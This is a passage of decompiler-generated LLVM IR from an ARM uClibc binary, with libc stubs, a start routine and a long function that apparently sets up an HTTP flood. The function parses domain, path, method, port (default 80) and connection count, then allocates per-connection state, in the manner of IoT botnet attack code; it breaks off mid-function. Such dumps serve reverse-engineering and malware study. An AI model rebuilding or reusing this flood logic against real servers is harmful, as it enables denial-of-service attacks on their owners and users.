define i32 @_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8db0 = call i32 @unknown_eb002b47()
  ret i32 %v4_8db0
}

define i32 @_closedir(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8dbc = call i32 @unknown_e1a04000()
  ret i32 %v4_8dbc

; uselistorder directives
  uselistorder i32 ()* @unknown_e1a04000, { 2, 1, 0 }
}

define i32 @_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8dc8 = call i32 @unknown_e59d001c()
  ret i32 %v4_8dc8

; uselistorder directives
  uselistorder i32 ()* @unknown_e59d001c, { 4, 3, 2, 1, 0 }
}

define i32 @_close(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8dd4 = call i32 @unknown_eb002b44()
  ret i32 %v4_8dd4
}

define i32 @_raise(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8de0 = call i32 @unknown_e59d101c()
  ret i32 %v4_8de0
}

define i32 @_free(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8dec = call i32 @unknown_e0812000()
  ret i32 %v4_8dec
}

define i32 @_sigprocmask() local_unnamed_addr {
entry:
  %v4_8df8 = call i32 @unknown_e3a0100a()
  ret i32 %v4_8df8
}

define i32 @_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8e04 = call i32 @unknown_e1a00004()
  ret i32 %v4_8e04
}

define i32 @function_8e08() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_8e08 = load i32, i32* @r4, align 4
  store i32 %v3_8e08, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1d918.58 to i32), i32* %r5.global-to-local, align 4
  %v2_8e10 = load i8, i8* bitcast (i8** @global_var_1d918.58 to i8*), align 4
  %v2_8e14 = icmp eq i8 %v2_8e10, 0
  br i1 %v2_8e14, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_8e18 = load i32, i32* @r0, align 4
  ret i32 %v12_8e18

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1d8fc.61 to i32), i32* %r4.global-to-local, align 4
  %v2_8e20 = load i32, i32* bitcast (i32** @global_var_1d8fc.61 to i32*), align 4
  store i32 %v2_8e20, i32* %r2.global-to-local, align 4
  %v2_8e28 = icmp eq i32 %v2_8e20, 0
  br i1 %v2_8e28, label %bb8, label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %bb7, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge
  %v1_8e34 = phi i32 [ %v1_8e34.pre, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge ], [ ptrtoint (i32** @global_var_1d8fc.61 to i32), %bb7 ]
  %v0_8e30 = phi i32 [ %v2_8e40, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge ], [ %v2_8e20, %bb7 ]
  %v1_8e30 = add i32 %v0_8e30, 4
  %v2_8e34 = inttoptr i32 %v1_8e34 to i32*
  store i32 %v1_8e30, i32* %v2_8e34, align 4
  %v0_8e3c = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8e3c)
  %v2_8e40 = load i32, i32* bitcast (i32** @global_var_1d8fc.61 to i32*), align 4
  store i32 %v2_8e40, i32* %r2.global-to-local, align 4
  %v2_8e48 = icmp eq i32 %v2_8e40, 0
  br i1 %v2_8e48, label %.loopexit, label %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge

dec_label_pc_8e30.dec_label_pc_8e30_crit_edge:    ; preds = %dec_label_pc_8e30
  %v1_8e34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8e30

.loopexit:                                        ; preds = %dec_label_pc_8e30
  %v2_8e68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8e68 = phi i32 [ %v2_8e68.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1d918.58 to i32), %bb7 ]
  %v3_8e68 = inttoptr i32 %v2_8e68 to i8*
  store i8 1, i8* %v3_8e68, align 1
  %v2_8e6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8e6c, i32* %r4.global-to-local, align 4
  %v11_8e6c = load i32, i32* @r0, align 4
  ret i32 %v11_8e6c

; uselistorder directives
  uselistorder i32 %v2_8e40, { 1, 2, 0 }
  uselistorder i32** @global_var_1d8fc.61, { 1, 0 }
  uselistorder i8** @global_var_1d918.58, { 1, 0 }
  uselistorder label %dec_label_pc_8e30, { 1, 0 }
}

define i32 @function_8e7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8e7c:
  %v0_8e7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8e7c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8e7c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8e7c, %bb
  %v5_8e84 = load i32, i32* @r0, align 4
  ret i32 %v5_8e84

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8e88() local_unnamed_addr {
.thread:
  %v2_8ea8 = load i32, i32* inttoptr (i32 120700 to i32*), align 4
  %v2_8eac = icmp eq i32 %v2_8ea8, 0
  br i1 %v2_8eac, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 120700

bb2:                                              ; preds = %.thread
  ret i32 120700

; uselistorder directives
  uselistorder i32 120700, { 1, 0, 2 }
}

define i32 @function_8ee0() local_unnamed_addr {
dec_label_pc_8ee0:
  %v5_8ee4 = load i32, i32* @r0, align 4
  ret i32 %v5_8ee4
}

define i32 @__start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8ef0 = ptrtoint i32* %stack_var_4 to i32
  %v7_8f10 = call i32 @___uClibc_main(i32 ptrtoint (i32* @global_var_10ddc.73 to i32), i32 %arg2, i32 %v4_8ef0, i32 35692, i32 85784, i32 %arg1, i32 %v4_8ef0)
  %v1_8f14 = call i32 @_abort(i32 %v7_8f10)
  ret i32 %v1_8f14
}

define i32 @function_8f24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8f24:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-10568 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-20809 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_8f24 = load i32, i32* @r4, align 4
  store i32 %v3_8f24, i32* %stack_var_-36, align 4
  %v6_8f24 = load i32, i32* @r5, align 4
  %v9_8f24 = load i32, i32* @r6, align 4
  %v15_8f24 = load i32, i32* @r8, align 4
  %v1_8f30 = urem i32 %arg3, 256
  store i32 %v1_8f30, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_8f3c = urem i32 %arg1, 256
  store i32 %v1_8f3c, i32* %ip.global-to-local, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v1_8f30, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8f58 = inttoptr i32 %arg4 to i32*
  %v6_8f58 = call i32 @function_acdc(i32 %v1_8f30, i32* %v5_8f58, i32 21, i32 0, i32 %arg2)
  %v0_8f5c = load i32, i32* @r5, align 4
  store i32 %v0_8f5c, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r4, align 4
  store i32 %v0_8f68, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_14f6c.76 to i32), i32* %r3.global-to-local, align 4
  %v6_8f70 = inttoptr i32 %v0_8f5c to i32*
  %v7_8f70 = call i32 @function_acdc(i32 %v0_8f68, i32* %v6_8f70, i32 20, i32 ptrtoint ([4 x i8]* @global_var_14f6c.76 to i32), i32 %v6_8f58)
  %v0_8f74 = load i32, i32* @r5, align 4
  store i32 %v0_8f74, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8f70, i32* %fp.global-to-local, align 4
  %v0_8f84 = load i32, i32* @r4, align 4
  store i32 %v0_8f84, i32* %r0.global-to-local, align 4
  %v5_8f88 = inttoptr i32 %v0_8f74 to i32*
  %v6_8f88 = call i32 @function_acdc(i32 %v0_8f84, i32* %v5_8f88, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8f8c = load i32, i32* @r5, align 4
  store i32 %v0_8f8c, i32* %r1.global-to-local, align 4
  store i32 %v6_8f88, i32* %sb.global-to-local, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f70.78 to i32), i32* %r3.global-to-local, align 4
  %v5_8fa0 = inttoptr i32 %v0_8f8c to i32*
  %v6_8fa0 = call i32 @function_acdc(i32 %v0_8f98, i32* %v5_8fa0, i32 22, i32 ptrtoint (i32* @global_var_14f70.78 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8fa4 = load i32, i32* @r5, align 4
  store i32 %v0_8fa4, i32* %r1.global-to-local, align 4
  store i32 %v6_8fa0, i32* @sl, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8fb0 = load i32, i32* @r4, align 4
  store i32 %v0_8fb0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8fb8 = inttoptr i32 %v0_8fa4 to i32*
  %v5_8fb8 = call i32 @function_b240(i32 %v0_8fb0, i32* %v4_8fb8, i32 24, i32 1)
  %v0_8fbc = load i32, i32* @r5, align 4
  store i32 %v0_8fbc, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8fb8, i32* @r6, align 4
  %v0_8fcc = load i32, i32* @r4, align 4
  store i32 %v0_8fcc, i32* %r0.global-to-local, align 4
  %v4_8fd0 = inttoptr i32 %v0_8fbc to i32*
  %v5_8fd0 = call i32 @function_b240(i32 %v0_8fcc, i32* %v4_8fd0, i32 7, i32 80)
  %v2_8fd8 = ptrtoint i32* %stack_var_-20809 to i32
  %v3_8fe0 = mul i32 %v5_8fd0, 65536
  store i32 %v3_8fe0, i32* %r3.global-to-local, align 4
  %tmp199 = bitcast i32* %stack_var_-20809 to i8*
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8ff4 = urem i32 %v5_8fd0, 65536
  store i32 %v3_8ff4, i32* %r8.global-to-local, align 4
  %v3_8ff8 = call i32 @_memset(i32 %v2_8fd8, i32 0, i32 10241)
  store i32 %v3_8ff8, i32* %r0.global-to-local, align 4
  %v0_8ffc = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8ffc = icmp slt i32 %v0_8ffc, 0
  store i1 %v1_8ffc, i1* %cpsr_n.global-to-local, align 1
  %v2_8ffc = icmp eq i32 %v0_8ffc, 0
  store i1 %v2_8ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ffc, label %.thread13, label %bb

bb:                                               ; preds = %dec_label_pc_8f24
  %v1_9000 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_9000 = icmp slt i32 %v1_9000, 0
  store i1 %v2_9000, i1* %cpsr_n.global-to-local, align 1
  %v3_9000 = icmp eq i32 %v1_9000, 0
  store i1 %v3_9000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9000, label %bb200, label %dec_label_pc_901c

.thread13:                                        ; preds = %dec_label_pc_8f24
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9010

bb200:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9010

dec_label_pc_9010:                                ; preds = %bb200, %dec_label_pc_903c, %.thread13, %dec_label_pc_902c, %dec_label_pc_901c
  %v29_9018 = phi i32 [ %v2_9040, %dec_label_pc_903c ], [ %v3_8ff8, %.thread13 ], [ %v3_8ff8, %bb200 ], [ %v2_9030, %dec_label_pc_902c ], [ %v2_9020, %dec_label_pc_901c ]
  %v2_9018 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_9018, i32* %r4.global-to-local, align 4
  store i32 %v6_8f24, i32* %r5.global-to-local, align 4
  store i32 %v9_8f24, i32* %r6.global-to-local, align 4
  store i32 %v15_8f24, i32* %r8.global-to-local, align 4
  ret i32 %v29_9018

dec_label_pc_901c:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_8ffc, i32* %r0.global-to-local, align 4
  %v1_9020 = inttoptr i32 %v0_8ffc to i8*
  %v2_9020 = call i32 @function_1460c(i8* %v1_9020)
  store i32 %v2_9020, i32* %r0.global-to-local, align 4
  %v1_9024 = add i32 %v2_9020, -255
  %v2_9024 = icmp ugt i32 %v2_9020, 254
  store i1 %v2_9024, i1* %cpsr_c.global-to-local, align 1
  %v3_9024 = sub i32 254, %v2_9020
  %v4_9024 = and i32 %v3_9024, %v2_9020
  %v5_9024 = icmp slt i32 %v4_9024, 0
  store i1 %v5_9024, i1* %cpsr_v.global-to-local, align 1
  %v6_9024 = icmp slt i32 %v1_9024, 0
  store i1 %v6_9024, i1* %cpsr_n.global-to-local, align 1
  %v7_9024 = icmp eq i32 %v2_9020, 255
  store i1 %v7_9024, i1* %cpsr_z.global-to-local, align 1
  %v8_9028 = icmp sgt i32 %v2_9020, 255
  br i1 %v8_9028, label %dec_label_pc_9010, label %dec_label_pc_902c

dec_label_pc_902c:                                ; preds = %dec_label_pc_901c
  %v0_902c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_902c, i32* %r0.global-to-local, align 4
  %v1_9030 = inttoptr i32 %v0_902c to i8*
  %v2_9030 = call i32 @function_1460c(i8* %v1_9030)
  store i32 %v2_9030, i32* %r0.global-to-local, align 4
  %v1_9034 = add i32 %v2_9030, -127
  %v2_9034 = icmp ugt i32 %v2_9030, 126
  store i1 %v2_9034, i1* %cpsr_c.global-to-local, align 1
  %v3_9034 = sub i32 126, %v2_9030
  %v4_9034 = and i32 %v3_9034, %v2_9030
  %v5_9034 = icmp slt i32 %v4_9034, 0
  store i1 %v5_9034, i1* %cpsr_v.global-to-local, align 1
  %v6_9034 = icmp slt i32 %v1_9034, 0
  store i1 %v6_9034, i1* %cpsr_n.global-to-local, align 1
  %v7_9034 = icmp eq i32 %v2_9030, 127
  store i1 %v7_9034, i1* %cpsr_z.global-to-local, align 1
  %v8_9038 = icmp sgt i32 %v2_9030, 127
  br i1 %v8_9038, label %dec_label_pc_9010, label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_902c
  %v0_903c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_903c, i32* %r0.global-to-local, align 4
  %v1_9040 = inttoptr i32 %v0_903c to i8*
  %v2_9040 = call i32 @function_1460c(i8* %v1_9040)
  store i32 %v2_9040, i32* %r0.global-to-local, align 4
  %v1_9044 = add i32 %v2_9040, -9
  %v2_9044 = icmp ugt i32 %v2_9040, 8
  store i1 %v2_9044, i1* %cpsr_c.global-to-local, align 1
  %v3_9044 = sub i32 8, %v2_9040
  %v4_9044 = and i32 %v3_9044, %v2_9040
  %v5_9044 = icmp slt i32 %v4_9044, 0
  store i1 %v5_9044, i1* %cpsr_v.global-to-local, align 1
  %v6_9044 = icmp slt i32 %v1_9044, 0
  store i1 %v6_9044, i1* %cpsr_n.global-to-local, align 1
  %v7_9044 = icmp eq i32 %v2_9040, 9
  store i1 %v7_9044, i1* %cpsr_z.global-to-local, align 1
  %v7_9048 = icmp sgt i32 %v2_9040, 9
  br i1 %v7_9048, label %dec_label_pc_9010, label %bb201

bb201:                                            ; preds = %dec_label_pc_903c
  %v10_9048 = ptrtoint i32* %stack_var_-404 to i32
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v8_904c = load i32, i32* @r4, align 4
  %v10_904c = add i32 %v10_9048, 364
  %v11_904c = inttoptr i32 %v10_904c to i32*
  store i32 %v8_904c, i32* %v11_904c, align 4
  br label %dec_label_pc_9054

dec_label_pc_9054:                                ; preds = %bb201, %bb205
  %v0_9054 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9054, i32* %r0.global-to-local, align 4
  %v1_9058 = inttoptr i32 %v0_9054 to i8*
  %v2_9058 = call i32 @function_1460c(i8* %v1_9058)
  store i32 %v2_9058, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9060 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9060, i32* %ip.global-to-local, align 4
  %v2_9064 = sub i32 %v2_9058, %v3_9060
  %v3_9064 = icmp uge i32 %v2_9058, %v3_9060
  store i1 %v3_9064, i1* %cpsr_c.global-to-local, align 1
  %v4_9064 = xor i32 %v3_9060, %v2_9058
  %v5_9064 = xor i32 %v2_9064, %v2_9058
  %v6_9064 = and i32 %v5_9064, %v4_9064
  %v7_9064 = icmp slt i32 %v6_9064, 0
  store i1 %v7_9064, i1* %cpsr_v.global-to-local, align 1
  %v8_9064 = icmp slt i32 %v2_9064, 0
  store i1 %v8_9064, i1* %cpsr_n.global-to-local, align 1
  %v9_9064 = icmp eq i32 %v2_9058, %v3_9060
  store i1 %v9_9064, i1* %cpsr_z.global-to-local, align 1
  %v7_9068 = icmp sgt i32 %v2_9058, %v3_9060
  br i1 %v7_9068, label %dec_label_pc_906c, label %dec_label_pc_9098

dec_label_pc_906c:                                ; preds = %dec_label_pc_9054
  %v0_906c = load i32, i32* %fp.global-to-local, align 4
  %v2_906c = add i32 %v0_906c, %v3_9060
  %v3_906c = inttoptr i32 %v2_906c to i8*
  %v4_906c = load i8, i8* %v3_906c, align 1
  %v6_906c = zext i8 %v4_906c to i32
  %v1_9070 = add nsw i32 %v6_906c, -32
  store i32 %v1_9070, i32* %r2.global-to-local, align 4
  %v1_9074 = add nsw i32 %v6_906c, -97
  store i32 %v1_9074, i32* %r3.global-to-local, align 4
  %v2_9078 = icmp ugt i32 %v1_9074, 24
  store i1 %v2_9078, i1* %cpsr_c.global-to-local, align 1
  %v3_9078 = sub nsw i32 121, %v6_906c
  %v4_9078 = and i32 %v3_9078, %v1_9074
  %v5_9078 = icmp slt i32 %v4_9078, 0
  store i1 %v5_9078, i1* %cpsr_v.global-to-local, align 1
  %v6_9078 = icmp ult i8 %v4_906c, 122
  store i1 %v6_9078, i1* %cpsr_n.global-to-local, align 1
  %v7_9078 = icmp eq i32 %v1_9074, 25
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  %v2_907c = xor i1 %v2_9078, true
  %v3_907c = or i1 %v7_9078, %v2_907c
  br i1 %v3_907c, label %bb202, label %bb203

bb202:                                            ; preds = %dec_label_pc_906c
  %v5_907c = trunc i32 %v1_9070 to i8
  store i8 %v5_907c, i8* %v3_906c, align 1
  %v0_9080.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_9080.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_906c, %bb202
  %v1_9084 = phi i1 [ %v2_9078, %dec_label_pc_906c ], [ %v1_9080.pre, %bb202 ]
  %v0_9084 = phi i1 [ false, %dec_label_pc_906c ], [ %v0_9080.pre, %bb202 ]
  %v2_9080 = xor i1 %v1_9084, true
  %v3_9080 = or i1 %v0_9084, %v2_9080
  br i1 %v3_9080, label %bb204, label %._crit_edge

._crit_edge:                                      ; preds = %bb203
  %v0_908c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb205

bb204:                                            ; preds = %bb203
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v7_9084 = load i32, i32* %v11_904c, align 4
  store i32 %v7_9084, i32* %ip.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %._crit_edge, %bb204
  %v0_908c = phi i32 [ %v0_908c.pre, %._crit_edge ], [ %v7_9084, %bb204 ]
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v1_908c = add i32 %v0_908c, 1
  store i32 %v1_908c, i32* %ip.global-to-local, align 4
  store i32 %v1_908c, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9054

dec_label_pc_9098:                                ; preds = %dec_label_pc_9054
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_909c = call i32 @function_13ce8(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_90a4 = call i32 @function_13ce8(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_90ac = call i32 @function_13ce8(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_90b4 = call i32 @function_13ce8(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_90bc = call i32 @function_13ce8(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_90c4 = call i32 @function_13ce8(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_90cc = call i32 @function_13ce8(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_90d4 = call i32 @function_13ce8(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_90dc = call i32 @function_13ce8(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_90e4 = call i32 @function_13ce8(i32 45)
  store i32 %v1_90e4, i32* %r0.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r6, align 4
  %v2_90e8 = add i32 %v0_90e8, -256
  %v3_90e8 = icmp ugt i32 %v0_90e8, 255
  store i1 %v3_90e8, i1* %cpsr_c.global-to-local, align 1
  %v4_90e8 = sub i32 255, %v0_90e8
  %v5_90e8 = and i32 %v4_90e8, %v0_90e8
  %v6_90e8 = icmp slt i32 %v5_90e8, 0
  store i1 %v6_90e8, i1* %cpsr_v.global-to-local, align 1
  %v7_90e8 = icmp slt i32 %v2_90e8, 0
  store i1 %v7_90e8, i1* %cpsr_n.global-to-local, align 1
  %v8_90e8 = icmp eq i32 %v0_90e8, 256
  store i1 %v8_90e8, i1* %cpsr_z.global-to-local, align 1
  %v5_90ec = icmp slt i32 %v0_90e8, 256
  br i1 %v5_90ec, label %thread-pre-split, label %bb206

bb206:                                            ; preds = %dec_label_pc_9098
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_9098, %bb206
  %v0_90f4 = phi i32 [ 256, %bb206 ], [ %v0_90e8, %dec_label_pc_9098 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_90f8 = call i32 @function_13ce8(i32 46)
  store i32 %v0_90f4, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_9108 = call i32 @_calloc(i32 %v0_90f4, i32 3140)
  store i32 %v2_9108, i32* %r0.global-to-local, align 4
  store i32 %v0_90f4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9110 = icmp slt i32 %v0_90f4, 0
  store i1 %v1_9110, i1* %cpsr_n.global-to-local, align 1
  %v2_9110 = icmp eq i32 %v0_90f4, 0
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9108, i32* @r5, align 4
  %tmp207 = icmp slt i32 %v0_90f4, 1
  br i1 %tmp207, label %dec_label_pc_924c, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %thread-pre-split
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_9124

dec_label_pc_9124:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_9120
  %v1_9130 = phi i32 [ %v1_abe4, %dec_label_pc_abc8 ], [ %v2_9108, %dec_label_pc_9120 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v1_8f3c, i32* %r1.global-to-local, align 4
  %v2_9130 = inttoptr i32 %v1_9130 to i32*
  store i32 -1, i32* %v2_9130, align 4
  %v0_9134 = load i32, i32* %r3.global-to-local, align 4
  %v1_9134 = trunc i32 %v0_9134 to i8
  %v2_9134 = load i32, i32* @r5, align 4
  %v3_9134 = add i32 %v2_9134, 4
  %v4_9134 = inttoptr i32 %v3_9134 to i8*
  store i8 %v1_9134, i8* %v4_9134, align 1
  %v0_9138 = load i32, i32* @r7, align 4
  %v1_913c = load i32, i32* %r1.global-to-local, align 4
  %v2_913c = srem i32 %v0_9138, %v1_913c
  store i32 %v2_913c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_9148 = and i32 %v2_913c, 536870912
  %v3_9148 = icmp ne i32 %v2_9148, 0
  store i1 %v3_9148, i1* %cpsr_c.global-to-local, align 1
  %v5_9148 = mul i32 %v2_913c, 24
  store i32 %v5_9148, i32* %r3.global-to-local, align 4
  %v2_914c = add i32 %v5_9148, %arg2
  store i32 %v2_914c, i32* @r6, align 4
  %v1_9150 = add i32 %v2_914c, 16
  %v2_9150 = inttoptr i32 %v1_9150 to i32*
  %v3_9150 = load i32, i32* %v2_9150, align 4
  store i32 %v3_9150, i32* %r2.global-to-local, align 4
  %v0_9154 = load i32, i32* @r5, align 4
  %v1_9154 = add i32 %v0_9154, 532
  store i32 %v1_9154, i32* %lr.global-to-local, align 4
  store i32 %v1_9154, i32* @r0, align 4
  %v0_915c = load i32, i32* @sl, align 4
  store i32 %v0_915c, i32* %r1.global-to-local, align 4
  %v2_9160 = add i32 %v0_9154, 16
  %v3_9160 = inttoptr i32 %v2_9160 to i32*
  store i32 %v3_9150, i32* %v3_9160, align 4
  %v0_9164 = load i32, i32* %lr.global-to-local, align 4
  %v2_9168 = inttoptr i32 %v1_9154 to i8*
  %v3_9168 = call i32 @function_14634(i8* %v2_9168, i32 %v0_915c)
  store i32 %v3_9168, i32* %r0.global-to-local, align 4
  %v0_916c = load i32, i32* @r5, align 4
  %v1_916c = add i32 %v0_916c, 532
  %v2_916c = inttoptr i32 %v1_916c to i8*
  %v3_916c = load i8, i8* %v2_916c, align 1
  %v4_916c = zext i8 %v3_916c to i32
  store i32 %v4_916c, i32* %r3.global-to-local, align 4
  %v2_9170 = icmp ugt i8 %v3_916c, 46
  store i1 %v2_9170, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9170 = icmp ult i8 %v3_916c, 47
  store i1 %v6_9170, i1* %cpsr_n.global-to-local, align 1
  %v7_9170 = icmp eq i8 %v3_916c, 47
  store i1 %v7_9170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9170, label %dec_label_pc_919c, label %dec_label_pc_9178

dec_label_pc_9178:                                ; preds = %dec_label_pc_9124
  store i32 %v0_9164, i32* %r0.global-to-local, align 4
  %v1_917c = inttoptr i32 %v0_9164 to i8*
  %v2_917c = call i32 @function_1460c(i8* %v1_917c)
  store i32 %v2_917c, i32* %r2.global-to-local, align 4
  %v0_9184 = load i32, i32* @r5, align 4
  %v1_9188 = add i32 %v0_9184, 533
  store i32 %v1_9188, i32* %r0.global-to-local, align 4
  store i32 %v0_9164, i32* %r1.global-to-local, align 4
  %v3_9190 = call i32 @_memmove(i32 %v1_9188, i32 %v0_9164, i32 %v2_917c)
  store i32 %v3_9190, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_9198 = load i32, i32* @r5, align 4
  %v3_9198 = add i32 %v2_9198, 532
  %v4_9198 = inttoptr i32 %v3_9198 to i8*
  store i8 47, i8* %v4_9198, align 1
  %v0_91a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_919c

dec_label_pc_919c:                                ; preds = %dec_label_pc_9124, %dec_label_pc_9178
  %v0_91a0 = phi i32 [ %v0_916c, %dec_label_pc_9124 ], [ %v0_91a0.pre, %dec_label_pc_9178 ]
  %v0_919c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_919c, i32* %r1.global-to-local, align 4
  %v1_91a0 = add i32 %v0_91a0, 1440
